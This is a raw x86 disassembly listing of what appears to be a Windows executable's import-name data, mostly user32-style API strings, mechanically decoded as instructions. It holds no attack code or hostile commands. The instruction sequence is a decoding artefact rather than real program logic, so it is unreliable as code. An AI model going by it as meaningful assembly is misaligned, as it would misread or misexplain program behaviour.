  41330c:	arpl   WORD PTR [edi+0x6e],bp
  41330f:	imul   esp,DWORD PTR [ebx+0x57],0x6f646e69
  413316:	ja     0x41338b
  413318:	add    BYTE PTR [eax],al
  41331a:	fld    QWORD PTR [eax]
  41331c:	inc    ebp
  41331d:	jno    0x413394
  41331f:	popa   
  413320:	ins    BYTE PTR es:[edi],dx
  413321:	push   edx
  413322:	arpl   WORD PTR gs:[eax+eax*1-0x45],si
  413327:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41332b:	fs push ebx
  41332d:	je     0x4133a1
  41332f:	imul   ebp,DWORD PTR [esi+0x67],0x1ee0041
  413336:	push   eax
  413337:	gs imul ecx,DWORD PTR gs:[ebp+0x65],0x73
  41333d:	jae    0x4133a0
  41333f:	addr16 gs inc ecx
  413342:	add    BYTE PTR [eax],al
  413344:	cmp    DWORD PTR [eax],eax
  413346:	inc    ebx
  413347:	push   0x70557261
  41334c:	jo     0x4133b3
  41334e:	jb     0x4133a7
  413350:	add    BYTE PTR [eax],al
  413352:	adc    eax,DWORD PTR [ecx]
  413354:	inc    edi
  413355:	gs je  0x41339c
  413358:	outs   dx,DWORD PTR ds:[esi]
  413359:	jne    0x4133bd
  41335b:	ins    BYTE PTR es:[edi],dx
  41335c:	gs inc ebx
  41335e:	ins    BYTE PTR es:[edi],dx
  41335f:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  413366:	add    BYTE PTR [eax],al
  413368:	mov    ds:0x57734901,eax
  41336d:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  413374:	jae    0x4133df
  413376:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41337a:	mov    esp,0x61724400
  41337f:	ja     0x4133d5
  413381:	gs js  0x4133f8
  413384:	push   edi
  413385:	add    BYTE PTR [ebp+0x61724400],dh
  41338b:	ja     0x4133da
  41338d:	outs   dx,BYTE PTR gs:[esi]
  41338f:	jne    0x4133d3
  413391:	popa   
  413392:	jb     0x413394
  413394:	jle    0x413397
  413396:	dec    eax
  413397:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  41339f:	jne    0x4133ea
  4133a1:	je     0x413408
  4133a3:	ins    DWORD PTR es:[edi],dx
  4133a4:	add    BYTE PTR [eax],al
  4133a6:	mov    al,BYTE PTR [edx]
  4133a8:	push   esp
  4133a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  4133b1:	ja     0x413426
  4133b3:	add    BYTE PTR [eax],ch
  4133b5:	add    BYTE PTR [ebx+0x68],al
  4133b8:	popa   
  4133b9:	jb     0x413407
  4133bb:	outs   dx,DWORD PTR ds:[esi]
  4133bc:	ja     0x413423
  4133be:	jb     0x413402
  4133c0:	jne    0x413428
  4133c2:	push   di
  4133c4:	add    BYTE PTR [eax],al
  4133c6:	bound  eax,QWORD PTR [eax]
  4133c8:	inc    ebx
  4133c9:	jb     0x413430
  4133cb:	popa   
  4133cc:	je     0x413433
  4133ce:	push   edi
  4133cf:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4133d6:	inc    ecx
  4133d7:	add    BYTE PTR [ebx+0x2],dh
  4133da:	push   ebx
  4133db:	gs je  0x413435
  4133de:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4133e5:	js     0x41345b
  4133e7:	inc    ecx
  4133e8:	add    BYTE PTR [eax],al
  4133ea:	pop    ecx
  4133eb:	add    dl,BYTE PTR [ebx+0x65]
  4133ee:	je     0x413442
  4133f0:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4133f5:	jo     0x41346b
  4133f7:	jns    0x4133f9
  4133f9:	add    bh,ah
  4133fb:	add    BYTE PTR [esi+0x72],al
  4133fe:	popa   
  4133ff:	ins    DWORD PTR es:[edi],dx
  413400:	gs push edx
  413402:	arpl   WORD PTR gs:[eax+eax*1+0x3b],si
  413407:	add    DWORD PTR [edi+0x65],eax
  41340a:	je     0x413459
  41340c:	gs jae 0x413482
  41340f:	popa   
  413410:	addr16 gs inc ebp
  413413:	js     0x413489
  413415:	jb     0x413478
  413417:	dec    ecx
  413418:	outs   dx,BYTE PTR ds:[esi]
  413419:	outs   dx,WORD PTR ds:[esi]
  41341b:	add    BYTE PTR [eax+0x2],ch
  41341e:	push   ebx
  41341f:	gs je  0x413477
  413422:	jae    0x413489
  413424:	jb     0x413475
  413426:	bound  ebp,QWORD PTR [edx+0x65]
  413429:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41342d:	outs   dx,WORD PTR ds:[esi]
  41342f:	jb     0x41349e
  413431:	popa   
  413432:	je     0x41349d
  413434:	outs   dx,DWORD PTR ds:[esi]
  413435:	outs   dx,BYTE PTR ds:[esi]
  413436:	push   edi
  413437:	add    BYTE PTR [ebx+0x73654400],dl
  41343d:	je     0x4134b1
  41343f:	outs   dx,DWORD PTR ds:[esi]
  413440:	jns    0x413483
  413442:	arpl   WORD PTR [ebx+0x65],sp
  413445:	ins    BYTE PTR es:[edi],dx
  413446:	gs jb  0x4134aa
  413449:	je     0x4134ba
  41344b:	jb     0x4134a1
  41344d:	popa   
  41344e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413452:	xor    al,BYTE PTR [ecx]
  413454:	inc    edi
  413455:	gs je  0x4134a5
  413458:	outs   dx,BYTE PTR gs:[esi]
  41345a:	jne    0x4134a5
  41345c:	je     0x4134c3
  41345e:	ins    DWORD PTR es:[edi],dx
  41345f:	inc    ebx
  413460:	outs   dx,DWORD PTR ds:[esi]
  413461:	jne    0x4134d1
  413463:	je     0x413465
  413465:	add    BYTE PTR [ebp+0x79656b02],bh
  41346b:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41346f:	jbe    0x4134d6
  413471:	outs   dx,BYTE PTR ds:[esi]
  413472:	je     0x413474
  413474:	call   0x65b1837a
  413479:	outs   dx,BYTE PTR ds:[esi]
  41347a:	dec    ecx
  41347b:	arpl   WORD PTR [edi+0x6e],bp
  41347e:	add    BYTE PTR [eax],al
  413480:	das    
  413481:	add    dl,BYTE PTR [ebx+0x65]
  413484:	je     0x4134c7
  413486:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41348a:	gs push edi
  41348c:	imul   ebp,DWORD PTR [esi+0x64],0x5f00776f
  413493:	add    dl,BYTE PTR [ebx+0x65]
  413496:	je     0x4134eb
  413498:	jns    0x41350d
  41349a:	inc    ebx
  41349b:	outs   dx,DWORD PTR ds:[esi]
  41349c:	ins    BYTE PTR es:[edi],dx
  41349d:	outs   dx,DWORD PTR ds:[esi]
  41349e:	jb     0x413513
  4134a0:	add    BYTE PTR [eax],al
  4134a2:	mov    dh,0x1
  4134a4:	dec    esp
  4134a5:	outs   dx,DWORD PTR ds:[esi]
  4134a6:	popa   
  4134a7:	fs dec ebp
  4134a9:	outs   dx,BYTE PTR gs:[esi]
  4134ab:	jne    0x4134ee
  4134ad:	add    BYTE PTR ds:0x61684300,ch
  4134b3:	jb     0x413503
  4134b5:	gs js  0x41352c
  4134b8:	push   edi
  4134b9:	add    dh,cl
  4134bb:	add    DWORD PTR [ebp+0x65],ecx
  4134be:	jae    0x413533
  4134c0:	popa   
  4134c1:	addr16 gs inc edx
  4134c4:	outs   dx,DWORD PTR ds:[esi]
  4134c5:	js     0x413508
  4134c7:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  4134ce:	jae    0x41353c
  4134d0:	popa   
  4134d1:	je     0x413538
  4134d3:	inc    ecx
  4134d4:	arpl   WORD PTR [ebx+0x65],sp
  4134d7:	ins    BYTE PTR es:[edi],dx
  4134d8:	gs jb  0x41353c
  4134db:	je     0x41354c
  4134dd:	jb     0x413536
  4134df:	add    BYTE PTR [ecx+0x66654400],cl
  4134e5:	inc    esi
  4134e6:	jb     0x413549
  4134e8:	ins    DWORD PTR es:[edi],dx
  4134e9:	gs push eax
  4134eb:	jb     0x41355c
  4134ed:	arpl   WORD PTR [ecx+0x0],ax
  4134f0:	test   DWORD PTR [edx],eax
  4134f2:	push   ebx
  4134f3:	jns    0x413568
  4134f5:	je     0x41355c
  4134f7:	ins    DWORD PTR es:[edi],dx
  4134f8:	push   eax
  4134f9:	popa   
  4134fa:	jb     0x41355d
  4134fc:	ins    DWORD PTR es:[edi],dx
  4134fd:	gs je  0x413565
  413500:	jb     0x413575
  413502:	dec    ecx
  413503:	outs   dx,BYTE PTR ds:[esi]
  413504:	outs   dx,WORD PTR ds:[esi]
  413506:	inc    ecx
  413507:	add    BYTE PTR ds:0x67655202,al
  41350d:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  413514:	popa   
  413515:	jae    0x41358a
  413517:	push   edi
  413518:	add    BYTE PTR [eax],al
  41351a:	iret   
  41351b:	add    DWORD PTR [ebp+0x65],ecx
  41351e:	jae    0x413593
  413520:	popa   
  413521:	addr16 gs inc edx
  413524:	outs   dx,DWORD PTR ds:[esi]
  413525:	js     0x41356c
  413527:	js     0x41356a
  413529:	add    BYTE PTR [ecx],ch
  41352b:	add    BYTE PTR [ebx+0x68],al
  41352e:	popa   
  41352f:	jb     0x41357d
  413531:	outs   dx,DWORD PTR ds:[esi]
  413532:	ja     0x413599
  413534:	jb     0x41358d
  413536:	add    BYTE PTR [eax],al
  413538:	pushf  
  413539:	add    BYTE PTR [ecx+ebp*2+0x61],al
  41353d:	ins    BYTE PTR es:[edi],dx
  41353e:	outs   dx,DWORD PTR ds:[esi]
  41353f:	addr16 inc edx
  413541:	outs   dx,DWORD PTR ds:[esi]
  413542:	js     0x413594
  413544:	popa   
  413545:	jb     0x4135a8
  413547:	ins    DWORD PTR es:[edi],dx
  413548:	inc    ecx
  413549:	add    BYTE PTR [esi],bh
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x41359d
  413550:	gs jae 0x4135c6
  413553:	popa   
  413554:	addr16 gs push edi
  413557:	add    BYTE PTR [edi+0x2],dl
  41355a:	push   ebx
  41355b:	gs je  0x4135ae
  41355e:	jb     0x4135cf
  413560:	jo     0x4135b9
  413562:	add    BYTE PTR [eax],al
  413564:	loope  0x413566
  413566:	inc    esi
  413567:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41356e:	outs   dx,DWORD PTR ds:[esi]
  41356f:	ja     0x4135b2
  413571:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  413578:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x6f43004a
  413580:	jo     0x4135fb
  413582:	inc    ecx
  413583:	arpl   WORD PTR [ebx+0x65],sp
  413586:	ins    BYTE PTR es:[edi],dx
  413587:	gs jb  0x4135eb
  41358a:	je     0x4135fb
  41358c:	jb     0x4135e2
  41358e:	popa   
  41358f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  413593:	add    cl,al
  413595:	add    BYTE PTR [ebp+0x6e],al
  413598:	popa   
  413599:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41359d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  4135a4:	pop    edx
  4135a5:	add    dl,BYTE PTR [ebx+0x65]
  4135a8:	je     0x4135fd
  4135aa:	arpl   WORD PTR [edx+0x6f],si
  4135ad:	ins    BYTE PTR es:[edi],dx
  4135ae:	ins    BYTE PTR es:[edi],dx
  4135af:	dec    ecx
  4135b0:	outs   dx,BYTE PTR ds:[esi]
  4135b1:	outs   dx,WORD PTR ds:[esi]
  4135b3:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4135ba:	push   ebx
  4135bb:	je     0x41362f
  4135bd:	imul   ebp,DWORD PTR [esi+0x67],0x350057
  4135c4:	inc    ebx
  4135c5:	push   0x6f547261
  4135ca:	dec    edi
  4135cb:	gs ins DWORD PTR es:[edi],dx
  4135cd:	push   edi
  4135ce:	add    BYTE PTR [eax],al
  4135d0:	inc    BYTE PTR [eax]
  4135d2:	inc    edi
  4135d3:	gs je  0x413619
  4135d6:	ins    BYTE PTR es:[edi],dx
  4135d7:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4135de:	jb     0x4135e0
  4135e0:	dec    edx
  4135e1:	add    dl,BYTE PTR [ebx+0x65]
  4135e4:	je     0x413633
  4135e6:	outs   dx,BYTE PTR gs:[esi]
  4135e8:	jne    0x41362e
  4135ea:	gs popaw 
  4135ed:	jne    0x41365b
  4135ef:	je     0x41363a
  4135f1:	je     0x413658
  4135f3:	ins    DWORD PTR es:[edi],dx
  4135f4:	add    BYTE PTR [eax],al
  4135f6:	mov    DWORD PTR [ecx],eax
  4135f8:	dec    ecx
  4135f9:	outs   dx,BYTE PTR ds:[esi]
  4135fa:	jbe    0x41365d
  4135fc:	ins    BYTE PTR es:[edi],dx
  4135fd:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  413605:	je     0x413607
  413607:	add    BYTE PTR [ecx+0x616f4c01],ch
  41360d:	fs inc edx
  41360f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x15004170
  413617:	add    DWORD PTR [edi+0x65],eax
  41361a:	je     0x413662
  41361c:	outs   dx,DWORD PTR ds:[esi]
  41361d:	jb     0x413684
  41361f:	addr16 jb 0x413691
  413622:	jne    0x413692
  413624:	fs push edi
  413626:	imul   ebp,DWORD PTR [esi+0x64],0xb800776f
  41362d:	add    BYTE PTR [edx+esi*2+0x61],al
  413631:	ja     0x413686
  413633:	je     0x413696
  413635:	je     0x41369c
  413637:	push   edi
  413638:	add    BYTE PTR [eax],al
  41363a:	xchg   ebx,eax
  41363b:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41363f:	outs   dx,BYTE PTR ds:[esi]
  413640:	jae    0x4136ae
  413642:	popa   
  413643:	je     0x4136aa
  413645:	inc    ecx
  413646:	arpl   WORD PTR [ebx+0x65],sp
  413649:	ins    BYTE PTR es:[edi],dx
  41364a:	gs jb  0x4136ae
  41364d:	je     0x4136be
  41364f:	jb     0x413692
  413651:	add    BYTE PTR [eax+0x57734901],ah
  413657:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41365e:	and    eax,0x6e655302
  413663:	fs dec ecx
  413665:	outs   dx,BYTE PTR ds:[esi]
  413666:	jo     0x4136dd
  413668:	je     0x41366a
  41366a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41366b:	add    DWORD PTR [ebx+0x69],ecx
  41366e:	ins    BYTE PTR es:[edi],dx
  41366f:	ins    BYTE PTR es:[edi],dx
  413670:	push   esp
  413671:	imul   ebp,DWORD PTR [ebp+0x65],0x1b10072
  413678:	dec    esp
  413679:	outs   dx,DWORD PTR ds:[esi]
  41367a:	popa   
  41367b:	fs dec ecx
  41367d:	ins    DWORD PTR es:[edi],dx
  41367e:	popa   
  41367f:	addr16 gs inc ecx
  413682:	add    BYTE PTR [eax],al
  413684:	daa    
  413685:	add    DWORD PTR [edi+0x65],eax
  413688:	je     0x4136d5
  41368a:	gs jns 0x4136ef
  41368d:	outs   dx,DWORD PTR ds:[esi]
  41368e:	popa   
  41368f:	jb     0x4136f5
  413691:	push   esp
  413692:	jns    0x413704
  413694:	add    BYTE PTR gs:[ebx+0x61724400],dh
  41369b:	ja     0x4136e6
  41369d:	arpl   WORD PTR [edi+0x6e],bp
  4136a0:	add    BYTE PTR [eax],al
  4136a2:	mov    BYTE PTR [edx],al
  4136a4:	push   esp
  4136a5:	popa   
  4136a6:	bound  esp,QWORD PTR [edx+0x65]
  4136a9:	fs push esp
  4136ab:	gs js  0x413722
  4136ae:	dec    edi
  4136af:	jne    0x413725
  4136b1:	push   edi
  4136b2:	add    BYTE PTR [eax],al
  4136b4:	push   0x74654701
  4136b9:	push   edi
  4136ba:	imul   ebp,DWORD PTR [esi+0x64],0x8200776f
  4136c1:	add    DWORD PTR [ecx+0x6e],ecx
  4136c4:	data16 ins BYTE PTR es:[edi],dx
  4136c6:	popa   
  4136c7:	je     0x41372e
  4136c9:	push   edx
  4136ca:	arpl   WORD PTR gs:[eax+eax*1-0x2b],si
  4136cf:	add    DWORD PTR [ebp+0x65],ecx
  4136d2:	jae    0x413747
  4136d4:	popa   
  4136d5:	addr16 gs inc edx
  4136d8:	outs   dx,DWORD PTR ds:[esi]
  4136d9:	js     0x413732
  4136db:	add    BYTE PTR [eax],bh
  4136dd:	add    dl,BYTE PTR [ebx+0x65]
  4136e0:	je     0x413725
  4136e2:	jne    0x413756
  4136e4:	jae    0x413755
  4136e6:	jb     0x4136e8
  4136e8:	mov    es,WORD PTR [edx]
  4136ea:	push   esp
  4136eb:	outs   dx,DWORD PTR ds:[esi]
  4136ec:	push   ebp
  4136ed:	outs   dx,BYTE PTR ds:[esi]
  4136ee:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  4136f5:	add    BYTE PTR [esi+0x52734901],bl
  4136fb:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  413700:	jo     0x413776
  413702:	jns    0x413704
  413704:	clc    
  413705:	add    BYTE PTR [edi+0x65],al
  413708:	je     0x41374d
  41370a:	ins    BYTE PTR es:[edi],dx
  41370b:	popa   
  41370c:	jae    0x413781
  41370e:	dec    esp
  41370f:	outs   dx,DWORD PTR ds:[esi]
  413710:	outs   dx,BYTE PTR ds:[esi]
  413711:	addr16 inc ecx
  413713:	add    BYTE PTR [ecx+0x57734901],ah
  413719:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  413720:	popa   
  413721:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  413725:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41372c:	arpl   WORD PTR [eax+0x54],bp
  41372f:	outs   dx,DWORD PTR ds:[esi]
  413730:	push   esp
  413731:	push   0x69577369
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	outs   dx,DWORD PTR fs:[esi]
  413739:	ja     0x41373b
  41373b:	add    BYTE PTR [ebx],cl
  41373d:	add    DWORD PTR [edi+0x65],eax
  413740:	je     0x413786
  413742:	inc    ebx
  413743:	inc    ebp
  413744:	js     0x413746
  413746:	stos   DWORD PTR es:[edi],eax
  413747:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41374b:	fs inc ebx
  41374d:	jne    0x4137c1
  41374f:	jae    0x4137c0
  413751:	jb     0x413794
  413753:	add    BYTE PTR [edx+0x766e4901],cl
  413759:	popa   
  41375a:	ins    BYTE PTR es:[edi],dx
  41375b:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  413763:	add    BYTE PTR [edx+0x57734901],ah
  413769:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  413770:	imul   esp,DWORD PTR [ebx+0x6f],0xe4006564
  413777:	add    DWORD PTR [edi+0x66],ecx
  41377a:	data16 jae 0x4137e2
  41377d:	je     0x4137d1
  41377f:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413784:	cmp    eax,0x65684300
  413789:	arpl   WORD PTR [ebx+0x52],bp
  41378c:	popa   
  41378d:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413795:	outs   dx,BYTE PTR ds:[esi]
  413796:	add    BYTE PTR [eax],al
  413798:	adc    eax,DWORD PTR [edx]
  41379a:	push   edx
  41379b:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  4137a4:	outs   dx,BYTE PTR ds:[esi]
  4137a5:	outs   dx,DWORD PTR fs:[esi]
  4137a7:	ja     0x4137f6
  4137a9:	gs jae 0x41381f
  4137ac:	popa   
  4137ad:	addr16 gs push edi
  4137b0:	add    BYTE PTR [eax],al
  4137b2:	or     al,BYTE PTR [edx]
  4137b4:	push   edx
  4137b5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  4137be:	je     0x41380b
  4137c0:	gs jns 0x4137c3
  4137c3:	add    BYTE PTR [eax+0x746e4901],cl
  4137c9:	gs jb  0x41383f
  4137cc:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  4137d1:	arpl   WORD PTR [eax+eax*1-0x17],si
  4137d5:	add    DWORD PTR [edi+0x70],ecx
  4137d8:	outs   dx,BYTE PTR gs:[esi]
  4137da:	dec    ecx
  4137db:	outs   dx,BYTE PTR ds:[esi]
  4137dc:	jo     0x413853
  4137de:	je     0x413824
  4137e0:	gs jae 0x41384e
  4137e3:	je     0x413854
  4137e5:	jo     0x4137e7
  4137e7:	add    BYTE PTR [edx],al
  4137e9:	add    dl,BYTE PTR [edx+0x65]
  4137ec:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  4137f4:	popa   
  4137f5:	jae    0x41386a
  4137f7:	inc    ecx
  4137f8:	add    BYTE PTR [eax],al
  4137fa:	jno    0x4137fe
  4137fc:	push   ebx
  4137fd:	gs je  0x413857
  413800:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  413807:	outs   dx,BYTE PTR ds:[esi]
  413808:	add    BYTE PTR [eax],al
  41380a:	mov    ecx,0x616f4c01
  41380f:	fs dec ebp
  413811:	outs   dx,BYTE PTR gs:[esi]
  413813:	jne    0x41386c
  413815:	add    BYTE PTR ds:0x74654701,ch
  41381b:	dec    ebp
  41381c:	outs   dx,BYTE PTR gs:[esi]
  41381e:	jne    0x413863
  413820:	push   0x4d6b6365
  413825:	popa   
  413826:	jb     0x413893
  413828:	inc    esp
  413829:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413830:	outs   dx,BYTE PTR ds:[esi]
  413831:	jae    0x413833
  413833:	add    BYTE PTR [esi+0x66654400],cl
  413839:	push   edi
  41383a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413841:	outs   dx,DWORD PTR ds:[esi]
  413842:	arpl   WORD PTR [ecx+0x0],ax
  413845:	add    BYTE PTR [ebx],al
  413847:	add    BYTE PTR [ecx+0x64],al
  41384a:	push   0x75
  41384c:	jae    0x4138c2
  41384e:	push   edi
  41384f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413856:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41385a:	add    BYTE PTR [eax],al
  41385c:	add    eax,0x6c6c4100
  413861:	outs   dx,DWORD PTR ds:[esi]
  413862:	ja     0x4138b7
  413864:	gs je  0x4138ad
  413867:	outs   dx,DWORD PTR ds:[esi]
  413868:	jb     0x4138cf
  41386a:	addr16 jb 0x4138dc
  41386d:	jne    0x4138dd
  41386f:	fs push edi
  413871:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413878:	ja     0x41387b
  41387a:	inc    edi
  41387b:	gs je  0x4138d5
  41387e:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  413885:	js     0x4138fb
  413887:	dec    esp
  413888:	outs   dx,BYTE PTR gs:[esi]
  41388a:	addr16 je 0x4138f5
  41388d:	push   edi
  41388e:	add    BYTE PTR [eax],al
  413890:	pushf  
  413891:	add    DWORD PTR [ecx+0x73],ecx
  413894:	dec    ecx
  413895:	arpl   WORD PTR [edi+0x6e],bp
  413898:	imul   esp,DWORD PTR [ebx+0x0],0x53024e00
  41389f:	gs je  0x4138ef
  4138a2:	outs   dx,BYTE PTR gs:[esi]
  4138a4:	jne    0x4138ef
  4138a6:	je     0x41390d
  4138a8:	ins    DWORD PTR es:[edi],dx
  4138a9:	dec    ecx
  4138aa:	outs   dx,BYTE PTR ds:[esi]
  4138ab:	outs   dx,WORD PTR ds:[esi]
  4138ad:	push   edi
  4138ae:	add    BYTE PTR [eax],al
  4138b0:	dec    eax
  4138b1:	add    dl,BYTE PTR [ebx+0x65]
  4138b4:	je     0x413903
  4138b6:	outs   dx,BYTE PTR gs:[esi]
  4138b8:	jne    0x4138ba
  4138ba:	inc    esp
  4138bb:	add    BYTE PTR [ebx+0x6c],al
  4138be:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4138c5:	jb     0x4138c7
  4138c7:	add    cl,al
  4138c9:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  4138cd:	imul   esi,DWORD PTR [ebp+0x70],0x49
  4138d1:	arpl   WORD PTR [edi+0x6e],bp
  4138d4:	dec    ecx
  4138d5:	fs inc esi
  4138d7:	jb     0x413948
  4138d9:	ins    DWORD PTR es:[edi],dx
  4138da:	inc    esp
  4138db:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4138e2:	jns    0x4138e4
  4138e4:	add    BYTE PTR ss:[ebx+0x68],al
  4138e8:	popa   
  4138e9:	jb     0x413940
  4138eb:	jo     0x41395d
  4138ed:	gs jb  0x413931
  4138f0:	add    BYTE PTR [eax],al
  4138f2:	mov    edi,0x636f4c01
  4138f7:	imul   edx,DWORD PTR [edi+0x69],0x6e
  4138fb:	outs   dx,DWORD PTR fs:[esi]
  4138fd:	ja     0x413954
  4138ff:	jo     0x413965
  413901:	popa   
  413902:	je     0x413969
  413904:	add    BYTE PTR [eax],al
  413906:	cmp    BYTE PTR [ecx],al
  413908:	inc    edi
  413909:	gs je  0x413959
  41390c:	outs   dx,BYTE PTR gs:[esi]
  41390e:	jne    0x413963
  413910:	je     0x413984
  413912:	imul   ebp,DWORD PTR [esi+0x67],0xc9000041
  413919:	add    DWORD PTR [ebp+0x61],ecx
  41391c:	jo     0x413975
  41391e:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413925:	imul   ebp,DWORD PTR [esi+0x74],0x1620073
  41392c:	inc    edi
  41392d:	gs je  0x413984
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	jo     0x41398a
  413933:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41393a:	pop    ecx
  41393b:	add    BYTE PTR [ebx+0x72],al
  41393e:	gs popa 
  413940:	je     0x4139a7
  413942:	inc    esp
  413943:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41394a:	jb     0x4139ad
  41394c:	ins    DWORD PTR es:[edi],dx
  41394d:	push   edi
  41394e:	add    BYTE PTR [eax],al
  413950:	inc    edx
  413951:	add    DWORD PTR [edi+0x65],eax
  413954:	je     0x4139a4
  413956:	gs js  0x4139cd
  413959:	inc    esp
  41395a:	ins    BYTE PTR es:[edi],dx
  41395b:	addr16 inc edi
  41395d:	jb     0x4139ce
  41395f:	jne    0x4139d1
  413961:	dec    ecx
  413962:	je     0x4139c9
  413964:	ins    DWORD PTR es:[edi],dx
  413965:	add    bl,bh
  413967:	add    DWORD PTR [eax+0x74],edx
  41396a:	dec    ecx
  41396b:	outs   dx,BYTE PTR ds:[esi]
  41396c:	push   edx
  41396d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413972:	push   ebp
  413973:	push   ebx
  413974:	inc    ebp
  413975:	push   edx
  413976:	xor    esi,DWORD PTR [edx]
  413978:	cs fs ins BYTE PTR es:[edi],dx
  41397b:	ins    BYTE PTR es:[edi],dx
  41397c:	add    BYTE PTR [eax],al
  41397e:	jns    0x4139c5
  413980:	pop    ecx
  413981:	je     0x4139cb
  413983:	push   ebp
  413984:	jp     0x4139f2
  413986:	jae    0x4139f8
  413988:	push   ecx
  413989:	dec    edx
  41398a:	push   0x47
  41398c:	jne    0x4139d4
  41398e:	fidivr WORD PTR ds:0x3de60041
  413994:	inc    ecx
  413995:	add    dh,dl
  413997:	cmp    eax,DWORD PTR [ecx+0x0]
  41399a:	out    dx,al
  41399b:	or     esi,DWORD PTR [edx+0x3a4f7d0e]
  4139a1:	dec    edi
  4139a2:	ja     0x4139f3
  4139a4:	cmp    DWORD PTR [edi+0x4f],ecx
  4139a7:	dec    edi
  4139a8:	cmp    al,0x4f
  4139aa:	jb     0x4139fb
  4139ac:	xor    ecx,DWORD PTR [edi+0x5e]
  4139af:	dec    edi
  4139b0:	ss dec edi
  4139b2:	jnp    0x413a03
  4139b4:	xor    eax,0x2a4f3a4f
  4139b9:	dec    edi
  4139ba:	push   ds
  4139bb:	push   edx
  4139bc:	pop    ds
  4139bd:	push   ebx
  4139be:	cmp    eax,0x3a4f7d4f
  4139c3:	dec    edi
  4139c4:	ja     0x413a15
  4139c6:	cmp    DWORD PTR [edi+0x4f],ecx
  4139c9:	dec    edi
  4139ca:	cmp    al,0x4f
  4139cc:	jb     0x413a1d
  4139ce:	xor    ecx,DWORD PTR [edi+0x5e]
  4139d1:	dec    edi
  4139d2:	ss dec edi
  4139d4:	ins    DWORD PTR es:[edi],dx
  4139d5:	dec    edi
  4139d6:	xor    eax,0x2a4f3a4f
  4139db:	dec    edi
  4139dc:	push   ds
  4139dd:	bound  ebx,QWORD PTR [edi]
  4139df:	arpl   WORD PTR ds:0x3a4f7d4f,di
  4139e5:	dec    edi
  4139e6:	push   0x4f
  4139e8:	cmp    DWORD PTR [edi+0x7b],ecx
  4139eb:	dec    edi
  4139ec:	cmp    eax,0x304f484f
  4139f1:	dec    edi
  4139f2:	cmp    cl,BYTE PTR [edi+0x34]
  4139f5:	dec    edi
  4139f6:	push   ds
  4139f7:	jb     0x413a18
  4139f9:	jae    0x413a0a
  4139fb:	or     DWORD PTR [eax+eax*4],0x7c
  4139ff:	nop
  413a00:	jge    0x413993
  413a02:	aas    
  413a03:	dec    edi
  413a04:	jbe    0x413a55
  413a06:	cmp    cl,BYTE PTR [edi+0x76]
  413a09:	dec    edi
  413a0a:	ds dec edi
  413a0c:	dec    eax
  413a0d:	dec    edi
  413a0e:	cmp    eax,0x314f7b4f
  413a13:	dec    edi
  413a14:	cmp    cl,BYTE PTR [edi+0x36]
  413a17:	dec    edi
  413a18:	push   ds
  413a19:	sbb    BYTE PTR [edi],0x83
  413a1c:	setae  BYTE PTR [eax+edx*4]
  413a20:	jl     0x4139c2
  413a22:	jge    0x4139c5
  413a24:	aas    
  413a25:	dec    edi
  413a26:	jbe    0x413a77
  413a28:	cmp    cl,BYTE PTR [edi+0x76]
  413a2b:	dec    edi
  413a2c:	ds dec edi
  413a2e:	dec    eax
  413a2f:	dec    edi
  413a30:	cmp    eax,0x314f6d4f
  413a35:	dec    edi
